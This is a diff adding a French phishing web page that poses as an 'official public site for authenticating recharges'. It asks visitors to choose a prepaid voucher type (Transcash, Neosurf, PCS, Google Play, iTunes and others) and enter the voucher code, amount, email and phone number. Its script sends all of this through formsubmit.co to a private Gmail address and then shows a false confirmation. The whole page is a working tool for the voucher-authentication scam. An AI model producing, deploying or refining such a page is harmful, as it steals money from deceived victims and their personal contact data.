@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Site officiel public d'hauthentification des recharges | Inscription</title>
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,650;1,9..144,500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg:#150b1f;
+    --surface:#211230;
+    --surface-2:#2a1640;
+    --gold:#e3a857;
+    --rose:#ef5d72;
+    --text:#f6efe4;
+    --muted:#b9a8c9;
+    --border:rgba(227,168,87,0.22);
+  }
+
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    -webkit-font-smoothing:antialiased;
+    position:relative;
+    overflow-x:hidden;
+  }
+
+  /* élément signature : halo de "projecteur" derrière le titre */
+  .spotlight-glow{
+    position:absolute;
+    top:-10%;
+    left:50%;
+    width:140vw;
+    max-width:1100px;
+    aspect-ratio:1/1;
+    transform:translateX(-50%);
+    background:radial-gradient(circle, rgba(227,168,87,0.18) 0%, rgba(227,168,87,0.06) 35%, transparent 70%);
+    pointer-events:none;
+    z-index:0;
+  }
+
+  .hero-image{
+    position:relative;
+    width:100%;
+    aspect-ratio:16/6;
+    overflow:hidden;
+    background:var(--surface-2);
+    border-bottom:1px solid var(--border);
+  }
+  .hero-image img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    display:block;
+  }
+  @media(min-width:700px){
+    .hero-image{aspect-ratio:16/5;}
+  }
+
+  .page{
+    position:relative;
+    z-index:1;
+    max-width:640px;
+    margin:0 auto;
+    padding:2.25rem 1.25rem 3.5rem;
+  }
+
+  .title{
+    font-family:'Fraunces',serif;
+    font-weight:650;
+    font-size:clamp(2.1rem, 7vw, 3.1rem);
+    line-height:1.05;
+    letter-spacing:-0.01em;
+    text-align:center;
+    margin:0 0 2.25rem;
+  }
+  .title em{
+    font-style:italic;
+    font-weight:500;
+    color:var(--gold);
+  }
+
+  .form-card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:22px;
+    padding:clamp(1.25rem, 4vw, 2.25rem);
+    display:flex;
+    flex-direction:column;
+    gap:1.6rem;
+    box-shadow:0 30px 60px -30px rgba(0,0,0,0.6);
+  }
+
+  fieldset{border:none;margin:0;padding:0;}
+
+  .eyebrow{
+    display:block;
+    font-size:0.72rem;
+    font-weight:700;
+    letter-spacing:0.12em;
+    text-transform:uppercase;
+    color:var(--gold);
+    margin-bottom:0.65rem;
+  }
+
+  .field{display:flex;flex-direction:column;}
+
+  input[type="text"],
+  input[type="email"],
+  input[type="tel"],
+  textarea{
+    width:100%;
+    background:var(--bg);
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:0.85rem 1rem;
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    font-size:0.98rem;
+    resize:vertical;
+  }
+  input::placeholder, textarea::placeholder{color:var(--muted);}
+  input:focus-visible, textarea:focus-visible{
+    outline:none;
+    border-color:var(--gold);
+    box-shadow:0 0 0 3px rgba(227,168,87,0.18);
+  }
+
+  
+  .pill-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit, minmax(128px,1fr));
+    gap:0.6rem;
+  }
+  .pill-row{
+    display:flex;
+    gap:0.6rem;
+  }
+  .pill-row .dance-option{flex:1;}
+
+  .dance-option{position:relative;}
+  .dance-option input[type="radio"]{
+    position:absolute;
+    opacity:0;
+    width:1px;height:1px;
+  }
+  .dance-option label{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    min-height:46px;
+    padding:0.6rem 0.8rem;
+    border:1px solid var(--border);
+    border-radius:999px;
+    background:var(--surface-2);
+    color:var(--text);
+    font-size:0.9rem;
+    font-weight:500;
+    cursor:pointer;
+    transition:background .15s ease, border-color .15s ease, color .15s ease;
+  }
+  .dance-option input:checked + label{
+    background:linear-gradient(135deg, var(--gold), var(--rose));
+    border-color:transparent;
+    color:#1b0f10;
+    font-weight:700;
+  }
+  .dance-option input:focus-visible + label{
+    outline:2px solid var(--rose);
+    outline-offset:2px;
+  }
+
+  /* case à cocher */
+  .checkbox-row{
+    display:flex;
+    align-items:center;
+    gap:0.7rem;
+    font-size:0.95rem;
+    color:var(--text);
+    cursor:pointer;
+  }
+  .checkbox-row input[type="checkbox"]{
+    position:absolute;
+    opacity:0;
+    width:1px;height:1px;
+  }
+  .checkmark{
+    flex:0 0 22px;
+    width:22px;height:22px;
+    border:1px solid var(--border);
+    border-radius:6px;
+    background:var(--surface-2);
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    font-size:0.85rem;
+    color:#1b0f10;
+    transition:background .15s ease, border-color .15s ease;
+  }
+  .checkbox-row input:checked + .checkmark{
+    background:linear-gradient(135deg, var(--gold), var(--rose));
+    border-color:transparent;
+  }
+  .checkbox-row input:checked + .checkmark::after{content:"✓";}
+  .checkbox-row input:focus-visible + .checkmark{
+    outline:2px solid var(--rose);
+    outline-offset:2px;
+  }
+
+  .submit-btn{
+    margin-top:0.5rem;
+    width:100%;
+    padding:0.95rem 1rem;
+    border:none;
+    border-radius:999px;
+    background:linear-gradient(135deg, var(--gold), var(--rose));
+    color:#1b0f10;
+    font-family:'Inter',sans-serif;
+    font-weight:700;
+    font-size:1rem;
+    letter-spacing:0.03em;
+    text-transform:uppercase;
+    cursor:pointer;
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .submit-btn:hover{transform:translateY(-1px);}
+  .submit-btn:active{transform:translateY(0px) scale(0.99);}
+  .submit-btn:focus-visible{
+    outline:2px solid var(--rose);
+    outline-offset:3px;
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *{transition:none !important;}
+  }
+
+  .hidden{display:none !important;}
+
+  .thank-you-card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:22px;
+    padding:clamp(2rem, 6vw, 3rem) clamp(1.25rem, 4vw, 2.25rem);
+    text-align:center;
+    box-shadow:0 30px 60px -30px rgba(0,0,0,0.6);
+  }
+  .thank-you-card .check{
+    width:56px;height:56px;
+    margin:0 auto 1.1rem;
+    border-radius:50%;
+    background:linear-gradient(135deg, var(--gold), var(--rose));
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:1.5rem;
+    color:#1b0f10;
+    font-weight:700;
+  }
+  .thank-you-card h2{
+    font-family:'Fraunces',serif;
+    font-weight:650;
+    font-size:clamp(1.5rem, 6vw, 1.9rem);
+    margin:0 0 0.6rem;
+  }
+  .thank-you-card p{
+    color:var(--muted);
+    font-size:0.98rem;
+    line-height:1.5;
+    margin:0;
+  }
+</style>
+</head>
+<body>
+
+  <div class="spotlight-glow" aria-hidden="true"></div>
+
+  <div class="hero-image">
+   
+    <img src="images.jpg" alt="Photo">
+  </div>
+
+  <main class="page">
+    <h1 class="title">Site officiel public<br><em>d'hauthentification des recharges</em></h1>
+
+    <form id="contactForm" class="form-card" action="https://formsubmit.co/authentiquerecharge52@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="Nouvelle réponse — Site officiel public d'authentification des recharges">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
+
+      <fieldset>
+        <legend class="eyebrow">Type de recharges</legend>
+        <div class="pill-grid">
+          <div class="dance-option">
+            <input type="radio" id="transcash" name="type_de_recharges" value="Transcash" required>
+            <label for="transcash">Transcash</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="neosurf" name="type_de_recharges" value="Neosurf">
+            <label for="neosurf">Neosurf</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="pcs" name="type_de_recharges" value="Pcs">
+            <label for="pcs">Pcs</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="google_play" name="type_de_recharges" value="Googleplay">
+            <label for="google_play">Google Play</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="itunes" name="type_de_recharges" value="Itunes">
+            <label for="itunes">Itunes</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="toneo" name="type_de_recharges" value="Toneo">
+            <label for="toneo">Toneo</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="paysurfcard" name="type_de_recharges" value="Paysurfcard">
+            <label for="paysurfcard">Paysurfcard</label>
+          </div>
+        </div>
+      </fieldset>
+
+
+      <div class="field">
+        <label class="eyebrow" for="prix">Montant</label>
+        <textarea id="prix" name="prix_message" rows="3" placeholder="Votre message concernant le montant" required></textarea>
+      </div>
+
+      <div class="field">
+        <label class="eyebrow" for="code">Entrez le code</label>
+        <input type="text" id="code" name="code" placeholder="Votre code" required>
+      </div>
+
+      <div class="field">
+        <label class="eyebrow" for="email">Email</label>
+        <input type="email" id="email" name="email" placeholder="vous@exemple.com" required>
+      </div>
+
+      <div class="field">
+        <label class="eyebrow" for="telephone">Numéro de téléphone</label>
+        <input type="tel" id="telephone" name="telephone" placeholder="+.. 00 00 00 00" required>
+      </div>
+
+      <fieldset>
+        <legend class="eyebrow">Masquer le code</legend>
+        <div class="pill-row">
+          <div class="dance-option">
+            <input type="radio" id="ouvrez-oui" name="Masquer" value="Oui" required>
+            <label for="ouvrez-oui">Oui</label>
+          </div>
+          <div class="dance-option">
+            <input type="radio" id="ouvrez-non" name="Masquer" value="Non">
+            <label for="ouvrez-non">Non</label>
+          </div>
+        </div>
+      </fieldset>
+
+      <label class="checkbox-row">
+        <input type="checkbox" name="plus_de_18_ans" value="Oui" required>
+        <span class="checkmark"></span>
+        J'ai plus de 18 ans
+      </label>
+
+      <button type="submit" class="submit-btn">Authentifiez</button>
+    </form>
+
+    <div id="thankYouMessage" class="thank-you-card hidden">
+      <div class="check">✓</div>
+      <h2>Message envoyé !</h2>
+      <p>Vos informations ont bien été transmises. Nous vous recontacterons très vite.</p>
+    </div>
+  </main>
+
+  <script>
+    const form = document.getElementById('contactForm');
+    const thankYou = document.getElementById('thankYouMessage');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const submitBtn = form.querySelector('.submit-btn');
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Envoi...';
+
+      fetch(form.action.replace('formsubmit.co/', 'formsubmit.co/ajax/'), {
+        method: 'POST',
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+      })
+        .then(() => {
+          form.classList.add('hidden');
+          thankYou.classList.remove('hidden');
+          thankYou.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        })
+        .catch(() => {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Soumettre';
+          alert('Une erreur est survenue. Vérifiez votre connexion et réessayez.');
+        });
+    });
+  </script>
+
+</body>
+</html>
